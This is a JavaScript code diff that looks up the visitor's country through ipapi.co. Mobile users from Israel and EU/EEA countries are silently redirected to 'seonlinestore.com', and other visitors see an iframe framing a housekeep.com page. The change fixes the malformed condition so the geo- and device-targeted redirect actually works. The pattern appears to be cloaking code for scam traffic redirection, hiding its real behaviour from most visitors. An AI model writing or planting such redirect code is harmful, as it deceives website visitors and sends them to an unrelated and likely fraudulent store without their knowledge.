@@ -48,46 +48,15 @@
            navigator.languages.some(lang => lang.startsWith('en'));
 }
 
-  fetch('https://ipapi.co/json/')
-  .then(response => response.json())
-  .then(data => {
-    // 扩展后的多国家条件判断（保持原有结构）
-    if (
-      data.country === 'IL' ||  // 以色列
-      data.country === 'AT' ||  // 奥地利
-      data.country === 'BE' ||  // 比利时
-      data.country === 'BG' ||  // 保加利亚
-      data.country === 'HR' ||  // 克罗地亚
-      data.country === 'CY' ||  // 塞浦路斯
-      data.country === 'CZ' ||  // 捷克
-      data.country === 'DK' ||  // 丹麦
-      data.country === 'EE' ||  // 爱沙尼亚
-      data.country === 'FI' ||  // 芬兰
-      data.country === 'FR' ||  // 法国
-      data.country === 'DE' ||  // 德国
-      data.country === 'GR' ||  // 希腊
-      data.country === 'HU' ||  // 匈牙利
-      data.country === 'IE' ||  // 爱尔兰
-      data.country === 'IT' ||  // 意大利
-      data.country === 'LV' ||  // 拉脱维亚
-      data.country === 'LT' ||  // 立陶宛
-      data.country === 'LU' ||  // 卢森堡
-      data.country === 'MT' ||  // 马耳他
-      data.country === 'NL' ||  // 荷兰
-      data.country === 'PL' ||  // 波兰
-      data.country === 'PT' ||  // 葡萄牙
-      data.country === 'RO' ||  // 罗马尼亚
-      data.country === 'SK' ||  // 斯洛伐克
-      data.country === 'SI' ||  // 斯洛文尼亚
-      data.country === 'ES' ||  // 西班牙
-      data.country === 'SE' ||  // 瑞典
-      data.country === 'IS' ||  // 冰岛
-      data.country === 'LI' ||  // 列支敦士登
-      data.country === 'NO'     // 挪威
-    ) && isMobileDevice() {
-      window.location.href = "https://seonlinestore.com";
-      return;
-    }
+ fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        // 严格的三重条件判断
+         if ((data.country === 'IL' || data.country === 'AT' || data.country === 'BE' || data.country === 'BG' || data.country === 'HR' || data.country === 'CY' || data.country === 'CZ' || data.country === 'DK' || data.country === 'EE' || data.country === 'FI' || data.country === 'FR' || data.country === 'DE' || data.country === 'GR' || data.country === 'HU' || data.country === 'IE' || data.country === 'IT' || data.country === 'LV' || data.country === 'LT' || data.country === 'LU' || data.country === 'MT' || data.country === 'NL' || data.country === 'PL' || data.country === 'PT' || data.country === 'RO' || data.country === 'SK' || data.country === 'SI' || data.country === 'ES' || data.country === 'SE' || data.country === 'IS' || data.country === 'LI' || data.country === 'NO') && isMobileDevice() ) {
+          window.location.href = "https://seonlinestore.com";
+          return;
+        } 
+	      
         var iframe = document.createElement('iframe');
         iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
         iframe.style.width = '100%';
